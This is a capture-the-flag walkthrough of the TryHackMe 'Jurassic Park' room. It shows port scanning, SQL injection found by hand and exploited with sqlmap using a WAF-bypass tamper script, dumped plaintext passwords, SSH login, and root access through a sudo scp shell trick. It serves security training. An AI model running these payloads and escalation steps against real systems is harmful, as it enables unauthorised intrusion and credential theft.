# Jurassic Park Challenge

**Room URL**: https://tryhackme.com/room/jurassicpark

---

# Objective:

Enumerate the web application, obtain credentials to the server, and find four flags hidden in the file system.

## Enumeration:

**Port Scanning**

```bash
sudo nmap -sS -F -n 10.10.165.112
Nmap scan report for 10.10.165.112
Host is up (0.14s latency).
Not shown: 98 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 1.22 seconds
```

visited the website on port 80, while I was viewing the tickets, I modified the URL to the `id=5` parameter, which revealed a ticket priced 0.

![image](https://github.com/user-attachments/assets/bee5e0b8-a332-4615-a07a-1481282dc139)

To test if the website is vulnerable to SQL injection, add a single quote next to the id `id=5'`, which will break the database query.

![image](https://github.com/user-attachments/assets/44f1db2f-d16e-47c0-b3ea-338377e60b3c)

we have confiremed that the website is vulnerable to **SQLi**, I used [SQLmap](https://sqlmap.org/) tool to automate the process of detection and exploiting **SQLi vulnerability**.

Before starting the attack, inject a malformed query and check the error message to identify the database.

![image](https://github.com/user-attachments/assets/4aac1e8f-0337-4906-b128-c24930055aa2)

This confirms that the back-end database is **MySQL**. Now let's start SQLi attack. I added this option `--tamper=space2comment.py` to bypass common WAF filters

```bash
sqlmap -u "http://10.10.165.112/item.php?id=5" --dbs --random-agent  --tamper=space2comment.py
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.9.4#stable}
|_ -| . [,]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

...
...
sqlmap identified the following injection point(s) with a total of 261 HTTP(s) requests:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=5 AND 6078=6078

    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: id=5 AND GTID_SUBSET(CONCAT(0x7162767a71,(SELECT (ELT(3314=3314,1))),0x717a626271),3314)

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=5 AND (SELECT 3423 FROM (SELECT(SLEEP(5)))jsGZ)
---
[10:30:24] [WARNING] changes made by tampering scripts are not included in shown payload content(s)
[10:30:24] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 16.10 or 16.04 (xenial or yakkety)
web application technology: Apache 2.4.18
back-end DBMS: MySQL >= 5.6
[10:30:25] [INFO] fetching database names
[10:30:26] [INFO] retrieved: 'information_schema'
[10:30:26] [INFO] retrieved: 'mysql'
[10:30:26] [INFO] retrieved: 'park'
[10:30:26] [INFO] retrieved: 'performance_schema'
[10:30:26] [INFO] retrieved: 'sys'
available databases [5]:
[*] information_schema
[*] mysql
[*] park
[*] performance_schema
[*] sys

[10:30:26] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/10.10.165.112'

```

**Findings:**
- Databases: information_schema, mysql, park, performance_schema, sys.
- Target database: park.

## Database Enumeration

Extract tables from **park**

```bash
sqlmap -u "http://10.10.165.112/item.php?id=5" --dbms=mysql -D park --tables --random-agent  --tamper=space2comment.py
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.9.4#stable}
|_ -| . [.]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org


---
[10:53:45] [WARNING] changes made by tampering scripts are not included in shown payload content(s)
[10:53:45] [INFO] testing MySQL
[10:53:45] [INFO] confirming MySQL
[10:53:46] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 16.04 or 16.10 (xenial or yakkety)
web application technology: Apache 2.4.18
back-end DBMS: MySQL >= 5.0.0
[10:53:46] [INFO] fetching tables for database: 'park'
[10:53:46] [INFO] retrieved: 'items'
[10:53:46] [INFO] retrieved: 'users'
Database: park
[2 tables]
+-------+
| items |
| users |
+-------+

[10:53:46] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/10.10.165.112'
```
**Findings:**
- Tables:  items, users

## Credential Dumping

```bash
sqlmap -u "http://10.10.165.112/item.php?id=5" --dbms=mysql -D park -T items,users --dump --random-agent  --tamper=space2comment.py
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.9.4#stable}
|_ -| . [']     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org
              
---

Database: park
Table: items
[5 entries]

| id  | sold | price  | package     | information                                                                                                                                                                            |
+-----+------+--------+-------------+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| 1   | 4    | 500000 | Gold        | Childen under 5 can attend free of charge and will be eaten for free. This package includes a dinosaur lunch, tour around the park AND a FREE dinosaur egg from a dino of your choice! |
| 2   | 11   | 250000 | Bronse      | Children under 5 can attend free of charge and eat free. This package includes a tour around the park and a dinosaur lunch! Try different dino's and rate the best tasting one!        |
| 3   | 27   | 100000 | Basic       | Children under 5 can attend for free and eat free. This package will include a basic tour around the park in the brand new automated cars!                                             |
| 5   | 0    | 0      | Development | Dennis, why have you blocked these characters: ' # DROP - username @ ---- Is this our WAF now?                                                                                         |
| 100 | -1   | -1     | ...         | Nope                                                                                                                                                                                   |
---

Database: park
Table: users
[2 entries]
+----+-----------+----------+
| id | password  | username |
+----+-----------+----------+
| 1  | D0nt3ATM3 |          |
| 2  | ih8dinos  |          |
+----+-----------+----------+

```

Used credentials (`dennis:ih8dinos`) to access the machine:

## Initial Access

```bash
ssh dennis@10.10.165.112     
The authenticity of host '10.10.165.112 (10.10.165.112)' can't be established.
ED25519 key fingerprint is SHA256:RgFyYsoL/n7m7p/t714RGHLqLtFNcn/+9tndcXsYijA.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
dennis@10.10.165.112's password: 

dennis@ip-10-10-165-112:~$ whoami
dennis
```

The user doesn't have root access. To gain privileged access, the first thing you do is to check what privileged commands your current user is allowed to run with `sudo` without requiring a password.

```bash
dennis@ip-10-10-165-112:~$ ls -al
total 52
drwxr-xr-x 4 dennis dennis 4096 Jul  5 15:27 .
drwxr-xr-x 4 root   root   4096 Feb 16  2019 ..
-rw------- 1 dennis dennis 1001 Feb 16  2019 .bash_history
-rw-r--r-- 1 dennis dennis  220 Feb 16  2019 .bash_logout
-rw-r--r-- 1 dennis dennis 3771 Feb 16  2019 .bashrc
drwx------ 2 dennis dennis 4096 Jul  5 15:06 .cache
-rw-rw-r-- 1 dennis dennis   93 Feb 16  2019 flag1.txt
drwxrwxr-x 2 dennis dennis 4096 Jul  5 15:15 .nano
-rw-r--r-- 1 dennis dennis  655 Feb 16  2019 .profile
-rw-rw-r-- 1 dennis dennis   32 Feb 16  2019 test.sh
-rw-r--r-- 1 dennis dennis 4096 Jul  5 15:21 .test.txt.swp
-rw------- 1 dennis dennis 4631 Jul  5 15:27 .viminfo
dennis@ip-10-10-165-112:~$ 
dennis@ip-10-10-165-112:~$ sudo -l
Matching Defaults entries for dennis on ip-10-10-165-112.eu-west-1.compute.internal:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User dennis may run the following commands on ip-10-10-165-112.eu-west-1.compute.internal:
    (ALL) NOPASSWD: /usr/bin/scp
```

## Privilege Escalation

Followed [GTFOBins](https://gtfobins.github.io/gtfobins/scp/) to abuse `scp`.

1. Created a temporary file with a reverse shell payload

```bash
TF=$(mktemp)                      
echo 'sh 0<&2 1>&2' > $TF      
chmod +x "$TF"                    
```
2. Executed scp with the malicious payload
```bash
sudo scp -S $TF x y:                   
```
`-S $TF` tells `scp` to use `$TF` (our script) instead of the default SSH for the connection. Since scp runs as root (via `sudo`), our payload executes with root privileges.

![image](https://github.com/user-attachments/assets/31b117cf-7d60-42e2-a42a-58296d63ef36)

